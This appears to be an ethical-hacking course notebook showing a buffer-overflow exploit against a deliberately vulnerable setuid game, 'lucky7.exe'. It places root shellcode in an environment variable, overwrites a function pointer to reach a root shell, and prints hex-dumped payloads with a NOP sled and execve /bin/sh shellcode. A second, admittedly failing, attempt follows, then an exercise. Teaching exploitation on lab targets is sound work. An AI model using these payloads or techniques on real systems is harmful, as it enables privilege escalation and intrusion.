    [You have 809190 credits] ->  Enter your choice [1-7]: 
    Change user name
    Enter your new name:
    Your name has been changed.
    
    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: John Smith]
    [You have 809190 credits] ->  Enter your choice [1-7]: 
    ~*~*~ Lucky 777 ~*~*~
    Costs 50 credits to play this game.
    Machine will generate 3 random numbers each between 1 and 9.
    If all 3 numbers are 7, you win a jackpot of 100 THOUSAND
    If all 3 numbers match, you win 10 THOUSAND
    Otherwise, you lose.
     Enter to continue...
    
    [DEBUG] current_game pointer 0x0804b14d
    3 random numers are: 3 4 4 
    Sorry! Better luck next time...
    
    You have 809140 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: John Smith]
    [You have 809140 credits] ->  Enter your choice [1-7]: 
    Thanks for playing! Good Bye.


## Exploiting with shellcode

### Stashing Shellcode as Environment Varaible
- compile `getenvaddr.cpp` file as 32-bit binary


```python
! g++ -m32 -o getenvaddr.exe getenvaddr.cpp
```

- export `/shellcode/shellcode_root.bin` as an env variable

```bash
┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ export SHELLCODE=$(cat ../../shellcode/shellcode_root.bin)

┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ ./getenvaddr.exe SHELLCODE ./lucky7.exe                                                                                
SHELLCODE will be at 0xffffdf80 with reference to ./lucky7.exe

┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ python -c 'import sys; sys.stdout.buffer.write(b"1\nn\n5\n" + b"A"*100 + b"\x80\xdf\xff\xff\n" + b"1\n")' > env_exploit

┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ cat env_exploit - | ./lucky7.exe                                                                             
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
[You have 858770 credits] ->  Enter your choice [1-7]: 
~*~*~ Lucky 7 ~*~*~
Costs 10 credits to play this game.
Machine will generate 1 random numbers each between 1 and 9.
If the number is 7, you win a jackpot of 10 THOUSAND
Otherwise, you lose.


[DEBUG] current_game pointer 0x0804b0bf
the random number is: 4 
Sorry! Better luck next time...

You have 858760 credits
Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�]
[You have 858760 credits] ->  Enter your choice [1-7]: 
Change user name
Enter your new name:
Your name has been changed.

-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����]
[You have 858760 credits] ->  Enter your choice [1-7]: 
[DEBUG] current_game pointer 0xffffdf80
whoami
root
exit

```

- congratulations on getting your shellcode executed!!

### Smuggling Shellcode into Program's Buffer
### Note: not working!!!

- as the program is setuid; it "should" give you a root shell if you can manage to smuggle and execute root shellcode!
- goal is to overwrite `player.name` with shellcode
- overflow the `player.current_game` attribute with the address of the smuggled shellcode
    - NOTE: we're not overflowing the return address, though you could!
- find the address of `player.name` attribute using gdb
- run `lucky7.exe` game from a terminal
- from another terminal finds its pid

```bash
# Terminal 1
┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ ./lucky7.exe 
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: John Smith                                                                                          ]
[You have 809140 credits] ->  Enter your choice [1-7]: 

#Terminal 2

┌──(kali㉿K)-[~]
└─$ ps aux | grep lucky7.exe
root        2639  0.0  0.0   5476  1264 pts/2    S+   15:01   0:00 ./lucky7.exe
kali        2932  0.0  0.0   6320   660 pts/3    S+   15:01   0:00 grep --color=auto lucky7.exe


┌──(kali㉿K)-[~]
└─$ sudo gdb -q --pid=2639
[sudo] password for kali: 
Attaching to process 2639
Reading symbols from /home/kali/projects/EthicalHacking/demos/other_overflow/lucky7.exe...
Reading symbols from /lib32/libstdc++.so.6...
(No debugging symbols found in /lib32/libstdc++.so.6)
Reading symbols from /lib32/libgcc_s.so.1...
(No debugging symbols found in /lib32/libgcc_s.so.1)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib32/libm.so.6...
(No debugging symbols found in /lib32/libm.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
0xf7fcb559 in __kernel_vsyscall ()
warning: File "/home/kali/.gdbinit" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
        add-auto-load-safe-path /home/kali/.gdbinit
line to your configuration file "/root/.gdbinit".
To completely disable this security protection add
        set auto-load safe-path /
line to your configuration file "/root/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
        info "(gdb)Auto-loading safe path"
(gdb) p/x &player.name
$1 = 0x8050128
(gdb) p/x &player.current_game
$2 = 0x805018c
(gdb) p/u 0x805018c - 0x8050128
$3 = 100
(gdb)
(gdb) quit


```
- so the address of `player.name` is 0x8050128
- the offset to overwrite `player.current_game` from `player.name` is 100!
- exploit code should look like this: [NOP sled | shellcode | SHELLCODE_ADDRESS]
- NOP sled + shellcode should be 100 bytes long
- let's find the length of the root shellcode in `shellcode` folder



```python
%pwd
```




    '/home/kali/projects/EthicalHacking'




```python
%cd ./demos/other_overflow
```

    /home/kali/projects/EthicalHacking/demos/other_overflow



```python
! wc -c ../../shellcode/shellcode_root.bin
```

    35 ../../shellcode/shellcode_root.bin



```python
# total NOP sled
100 - 35
```




    65




```python
# let's write NOP sled to a binary file
! python -c 'import sys; sys.stdout.buffer.write(b"\x90"*65)' > ./lucky7_exploit.bin
```


```python
! wc -c ./lucky7_exploit.bin
```

    65 ./lucky7_exploit.bin



```python
# lets append shellcode to the exploitcode
! cat ../../shellcode/shellcode_root.bin >> ./lucky7_exploit.bin
```


```python
# let's check the size of exploit code
! wc -c ./lucky7_exploit.bin
```

    100 ./lucky7_exploit.bin



```python
print(hex(0x08050128 + 25))
```

    0x8050141



```python
# let's append the address of player.name: 0x8050128
! python -c 'import sys; sys.stdout.buffer.write(b"\x41\x01\x05\x08\n")' >> ./lucky7_exploit.bin
```


```python
! hexdump -C ./lucky7_exploit.bin
```

    00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
    *
    00000040  90 31 c0 31 db 31 c9 99  b0 a4 cd 80 6a 0b 58 51  |.1.1.1......j.XQ|
    00000050  68 2f 2f 73 68 68 2f 62  69 6e 89 e3 51 89 e2 53  |h//shh/bin..Q..S|
    00000060  89 e1 cd 80 41 01 05 08  0a                       |....A....|
    00000069



```python
# let's check the size of exploit code
! wc -c ./lucky7_exploit.bin
```

    105 ./lucky7_exploit.bin



```python
! python -c 'import sys; sys.stdout.buffer.write(b"1\nn\n5\n")' > lucky7_final_exploit.bin
```


```python
! hexdump -C lucky7_final_exploit.bin
```

    00000000  31 0a 6e 0a 35 0a                                 |1.n.5.|
    00000006



```python
! cat lucky7_exploit.bin >> lucky7_final_exploit.bin
```


```python
! python -c 'import sys; sys.stdout.buffer.write(b"1\n")' >> lucky7_final_exploit.bin
```


```python
! wc -c ./exploit_game.bin
```

    116 ./exploit_game.bin



```python
! hexdump -C ./lucky7_final_exploit.bin
```

    00000000  31 0a 6e 0a 35 0a 90 90  90 90 90 90 90 90 90 90  |1.n.5...........|
    00000010  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
    *
    00000040  90 90 90 90 90 90 90 31  c0 31 db 31 c9 99 b0 a4  |.......1.1.1....|
    00000050  cd 80 6a 0b 58 51 68 2f  2f 73 68 68 2f 62 69 6e  |..j.XQh//shh/bin|
    00000060  89 e3 51 89 e2 53 89 e1  cd 80 41 01 05 08 0a 31  |..Q..S....A....1|
    00000070  0a                                                |.|
    00000071


- exploit the program with the final exploit created

``` 
$ cat lucky7_final_exploit.bin - | ./lucky7.exe
```

- NOTICE: the hyphen after the exploit
- tells the cat program to send standard input after the exploit buffer, returning control of the input
- eventhough the shell doesn't display its prompt, it is still accessible
- stash both and user and root shell and force the program execute them

```bash
┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ cat lucky7_final_exploit.bin - | ./lucky7.exe    
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: ��������������������������������������������������������1����$h/zsh/binh/usr                      ]
[You have 918420 credits] ->  Enter your choice [1-7]: 
~*~*~ Lucky 7 ~*~*~
Costs 10 credits to play this game.
Machine will generate 1 random numbers each between 1 and 9.
If the number is 7, you win a jackpot of 10 THOUSAND
Otherwise, you lose.


[DEBUG] current_game pointer 0x0804b0bf
the random number is: 7 
*+*+*+*+*+* JACKPOT 10 THOUSAND *+*+*+*+*+*
Congratulations!
 You have won the jackpot of 10000 (10K) credits!

You have 928410 credits
Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: ��������������������������������������������������������1����$h/zsh/binh/usr                      �]
[You have 928410 credits] ->  Enter your choice [1-7]: 
Change user name
Enter your new name:
Your name has been changed.

-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: �����������������������������������������������������������������1�1�1ə��j
                                                                                 XQh//shh/bin��Q��S��]
[You have 928410 credits] ->  Enter your choice [1-7]: 
[DEBUG] current_game pointer 0x08050141
ls
zsh: broken pipe         cat lucky7_final_exploit.bin - | 
zsh: segmentation fault  ./lucky7.exe

```


## Exercise
- smuggle the shellcode into the name field, find it's address and exploit the program.
- smuggle both user and root shells


```python

```
